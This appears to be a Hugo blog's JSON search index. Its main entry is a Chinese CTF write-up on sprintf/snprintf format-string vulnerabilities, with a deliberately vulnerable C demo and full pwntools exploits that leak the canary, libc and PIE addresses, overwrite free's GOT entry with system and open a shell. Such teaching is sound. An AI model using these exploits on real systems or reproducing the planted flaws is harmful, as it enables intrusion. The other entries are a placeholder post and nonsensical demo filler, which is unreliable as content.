[{"content":"s(n)printf函数fmt漏洞 函数原型 1 int sprintf(char *str, const char *format, ...); str:目标字符数组，用于储存格式化后的结果\nformat:格式化字符串，包含普通字符和格式符，如a=%d\n\u0026hellip;:可变参数，对应格式字符串中的格式符，类型需与格式符匹配。如 若参数format为a=%d则\u0026hellip;应为int类型的整数\n返回值是向str中输入的字符个数\n1 int s[n]printf(char *str, size_t size, const char *format, ...) 比sprintf 多了一个size_t参数，用于限制可写入字符数\ndemo（这个函数的正常使用方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { char buf[200]; int num = 123; float f = 3.14159; char str[] = \u0026#34;hello\u0026#34;; int arr[] = {1, 2, 3}; // 1. 格式化整数、字符串、浮点数 int len1 = sprintf(buf, \u0026#34;整数: %d, 字符串: %s, 浮点数: %.2f\u0026#34;, num, str, f); printf(\u0026#34;结果1: %s\\n\u0026#34;, buf); printf(\u0026#34;写入字符数: %d (验证: %zu)\\n\\n\u0026#34;, len1, strlen(buf)); // 不含 \\0 // 2. 格式化十六进制、地址 int len2 = sprintf(buf, \u0026#34;十六进制: 0x%x, 数组地址: %p\u0026#34;, num, arr); printf(\u0026#34;结果2: %s\\n\u0026#34;, buf); printf(\u0026#34;写入字符数: %d (验证: %zu)\\n\\n\u0026#34;, len2, strlen(buf)); // 3. 拼接多个数据 int len3 = sprintf(buf, \u0026#34;综合: num=%d, str=%s, f=%.1f, arr@%p\u0026#34;, num, str, f, arr); printf(\u0026#34;结果3: %s\\n\u0026#34;, buf); printf(\u0026#34;写入字符数: %d (验证: %zu)\\n\u0026#34;, len3, strlen(buf)); return 0; } 漏洞原理 攻击者通过溢出等手段可修改format参数，完整任意地址读写\nPS:snprintf是把格式化字符串的地址记下来，每次要处理一个字符时，先从地址处取格式化字符串，然后再根据格式化字符串来处理字符\ndemo 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; #include\u0026lt;unistd.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void backdoor(){ system(\u0026#34;/bin/sh\u0026#34;); return; } int main(){ char buf1[0x100]; char buf2[0x20]; char buf3[0x20]=\u0026#34;%s\\x00\u0026#34;; memset(buf1,0,0x100); puts(\u0026#34;input your data\u0026#34;); read(0,buf1,0x1000); sprintf(buf2,buf3,buf1); printf(\u0026#34;your input is %s\u0026#34;,buf2); memset(buf1,0,0x100); puts(\u0026#34;input your data again\u0026#34;); read(0,buf1,0x1000); sprintf(buf2,buf3,buf1); printf(\u0026#34;your input is %s\u0026#34;,buf2); return 0; } 先利用sprintf的格式化字符串漏洞，溢出buf2从而修改buf3(sptintf的格式化字符串参数)，这样就可以通过任意地址读来泄露canary，然后利用read(0,buf1,0x1000) re2text.exp如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from pwn import * p=process(\u0026#39;./sprintf\u0026#39;) context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;) p.recvuntil(b\u0026#39;input your data\u0026#39;) pay1=b\u0026#39;a\u0026#39;*32+b\u0026#39;bb%46$p\u0026#39; #0x92 is offest 150 p.sendline(pay1) #gdb.attach(p) p.recvuntil(b\u0026#39;0x\u0026#39;) canary=int(p.recv(16),16) print(hex(canary)) p.recvuntil(b\u0026#39;input your data again\u0026#39;) shell=0x4011f6 ret=0x40120F pay2=b\u0026#39;\\x00\u0026#39;*(0x108)+p64(canary)+p64(0)+p64(ret)+p64(shell) p.sendline(pay2) #gdb.attach(p) p.interactive() 这个demo写的不太合适，修改返回地址的时候用的并不是sprintf的漏洞\n可以再看下下面的例题\n攻防世界EasyPwn 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 __int64 __fastcall main(int a1, char **a2, char **a3) { int i; // [rsp+10h] [rbp-20h] int v5; // [rsp+14h] [rbp-1Ch] void *buf; // [rsp+18h] [rbp-18h] char nptr[8]; // [rsp+20h] [rbp-10h] BYREF unsigned __int64 v8; // [rsp+28h] [rbp-8h] v8 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(_bss_start, 0LL, 2, 0LL); for ( i = 0; i \u0026lt;= 11; ++i ) { write(1, \u0026#34;Input Your Code:\\n\u0026#34;, 0x11uLL); __isoc99_scanf(\u0026#34;%4s\u0026#34;, nptr); v5 = atoi(nptr); if ( v5 == 1 ) { vuln(); } else { if ( v5 != 2 ) return 0LL; buf = malloc(0x100uLL); write(1, \u0026#34;Input Your Name:\\n\u0026#34;, 0x11uLL); read(0, buf, 0x100uLL); printf(\u0026#34;OK!I Know Your Name :%sNow!\u0026#34;, (const char *)buf); free(buf); } } return 0LL; } unsigned __int64 vuln() { char s[1024]; // [rsp+10h] [rbp-BF0h] BYREF char v2[1000]; // [rsp+410h] [rbp-7F0h] BYREF char v3[1024]; // [rsp+7F8h] [rbp-408h] BYREF unsigned __int64 v4; // [rsp+BF8h] [rbp-8h] v4 = __readfsqword(0x28u); memset(s, 0, sizeof(s)); memset(v3, 0, 8uLL); memset(v2, 0, 0x7E8uLL); strcpy(v3, \u0026#34;%s\u0026#34;); puts(\u0026#34;Welcome To WHCTF2017:\u0026#34;); read(0, s, 0x438uLL); snprintf(v2, 0x7D0uLL, v3, s); printf(\u0026#34;Your Input Is :%s\\n\u0026#34;, v2); return __readfsqword(0x28u) ^ v4; } read(0, s, 0x438uLL);长度不够rop但vul()函数的snprintf函数可溢出v3，可以利用fmt任意地址读泄露libc和pie地址\n随后任意地址写，修改freegot表为system地址(可以使用bss段上fmt的方法)\n注意由于延迟绑定机制我们需要先调用一次free完成绑定，exp如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 from pwn import * context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;) p=process(\u0026#39;./pwn1\u0026#39;) libc=ELF(\u0026#39;/home/baota/桌面/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6\u0026#39;) elf=ELF(\u0026#39;./pwn1\u0026#39;) p.recvuntil(b\u0026#39;Input Your Code:\u0026#39;) p.sendline(b\u0026#39;2\u0026#39;) p.recvuntil(b\u0026#39;Input Your Name:\u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) #free got p.recvuntil(b\u0026#39;Input Your Code:\u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) p.recvuntil(b\u0026#39;Welcome To WHCTF2017:\u0026#39;) pay1=b\u0026#39;a\u0026#39;*1000+b\u0026#39;bb%397$p\u0026#39; p.sendline(pay1) #0x10b is offest 400 p.recvuntil(b\u0026#39;0x\u0026#39;) libcbase=int(p.recv(12),16)-0x20840 print(hex(libcbase)) #gdb.attach(p) sys=libcbase+libc.symbols[\u0026#39;system\u0026#39;] p.recvuntil(b\u0026#39;Input Your Code:\u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) p.recvuntil(b\u0026#39;Welcome To WHCTF2017:\u0026#39;) pay2=b\u0026#39;a\u0026#39;*1000+b\u0026#39;bb%396$p\u0026#39; p.sendline(pay2) p.recvuntil(b\u0026#39;0x\u0026#39;) addr=int(p.recv(12),16) pie=addr-0xda0 print(hex(addr)) print(hex(pie)) free_got = pie + elf.got[\u0026#39;free\u0026#39;] print(hex(free_got)) print(hex(sys)) p.recvuntil(b\u0026#39;Input Your Code:\u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) p.recvuntil(b\u0026#39;Welcome To WHCTF2017:\u0026#39;) #$360$p a=(sys \u0026amp; 0xffff)-1000-0x16 gdb.attach(p) pay3=b\u0026#39;a\u0026#39;*1000+(b\u0026#39;bb%\u0026#39;+str(a).encode() + b\u0026#39;c%133$hn\u0026#39;).ljust(16,b\u0026#39;a\u0026#39;)+p64(free_got) p.sendline(pay3) b= ((sys\u0026gt;\u0026gt;16) \u0026amp; 0xffff)-1000 - 0x16 pay4 = b\u0026#39;a\u0026#39; * 1000 + (b\u0026#39;bb%\u0026#39;+str(b).encode()+b\u0026#39;c%133$hn\u0026#39;).ljust(16, b\u0026#39;a\u0026#39;)+p64(free_got+2) p.recvuntil(b\u0026#39;Input Your Code:\u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) p.recvuntil(b\u0026#39;Welcome To WHCTF2017:\u0026#39;) p.sendline(pay4) #gdb.attach(p) p.recvuntil(b\u0026#39;Input Your Code:\u0026#39;) p.sendline(b\u0026#39;2\u0026#39;) p.recvuntil(b\u0026#39;Input Your Name:\u0026#39;) p.sendline(b\u0026#39;/bin/sh\\x00\u0026#39;) #gdb.attach(p) p.interactive() ","date":"2025-09-10T23:34:28+08:00","permalink":"http://localhost:1313/p/snprintf%E5%87%BD%E6%95%B0fmt%E6%BC%8F%E6%B4%9E/","title":"s(n)printf函数fmt漏洞"},{"content":"这是新建的文档\n怎么多了这么多奇怪的东西\n","date":"2025-09-10T23:34:28+08:00","permalink":"http://localhost:1313/p/test/","title":"Test"},{"content":"正文测试 而这些并不是完全重要，更加重要的问题是， 带着这些问题，我们来审视一下学生会退会。 既然如何， 对我个人而言，学生会退会不仅仅是一个重大的事件，还可能会改变我的人生。 我们不得不面对一个非常尴尬的事实，那就是， 可是，即使是这样，学生会退会的出现仍然代表了一定的意义。 学生会退会，发生了会如何，不发生又会如何。 经过上述讨论， 生活中，若学生会退会出现了，我们就不得不考虑它出现了的事实。 学生会退会，到底应该如何实现。 这样看来， 在这种困难的抉择下，本人思来想去，寝食难安。 对我个人而言，学生会退会不仅仅是一个重大的事件，还可能会改变我的人生。 就我个人来说，学生会退会对我的意义，不能不说非常重大。 莎士比亚曾经提到过，人的一生是短的，但如果卑劣地过这一生，就太长了。这似乎解答了我的疑惑。 莫扎特说过一句富有哲理的话，谁和我一样用功，谁就会和我一样成功。这启发了我， 对我个人而言，学生会退会不仅仅是一个重大的事件，还可能会改变我的人生。 学生会退会，到底应该如何实现。 一般来说， 从这个角度来看， 这种事实对本人来说意义重大，相信对这个世界也是有一定意义的。 在这种困难的抉择下，本人思来想去，寝食难安。 了解清楚学生会退会到底是一种怎么样的存在，是解决一切问题的关键。 一般来说， 生活中，若学生会退会出现了，我们就不得不考虑它出现了的事实。 问题的关键究竟为何？ 而这些并不是完全重要，更加重要的问题是。\n奥斯特洛夫斯基曾经说过，共同的事业，共同的斗争，可以使人们产生忍受一切的力量。　带着这句话，我们还要更加慎重的审视这个问题： 一般来讲，我们都必须务必慎重的考虑考虑。 既然如此， 这种事实对本人来说意义重大，相信对这个世界也是有一定意义的。 带着这些问题，我们来审视一下学生会退会。 我认为， 我认为， 在这种困难的抉择下，本人思来想去，寝食难安。 问题的关键究竟为何？ 每个人都不得不面对这些问题。 在面对这种问题时， 要想清楚，学生会退会，到底是一种怎么样的存在。 我认为， 既然如此， 每个人都不得不面对这些问题。 在面对这种问题时， 那么， 我认为， 学生会退会因何而发生。\n引用 思念是最暖的忧伤像一双翅膀\n让我停不了飞不远在过往游荡\n不告而别的你 就算为了我着想\n这么沉痛的呵护 我怎么能翱翔\n最暖的憂傷 - 田馥甄\n图片 1 2 3 ![Photo by Florian Klauer on Unsplash](florian-klauer-nptLmg6jqDo-unsplash.jpg) ![Photo by Luca Bravo on Unsplash](luca-bravo-alS7ewQ41M8-unsplash.jpg) ![Photo by Helena Hertz on Unsplash](helena-hertz-wWZzXlDpMog-unsplash.jpg) ![Photo by Hudai Gayiran on Unsplash](hudai-gayiran-3Od_VKcDEAA-unsplash.jpg) 相册语法来自 Typlog\n","date":"2020-09-09T00:00:00Z","image":"http://localhost:1313/p/test-chinese/helena-hertz-wWZzXlDpMog-unsplash_hu_2307260c751d0e0b.jpg","permalink":"http://localhost:1313/p/test-chinese/","title":"Chinese Test"}]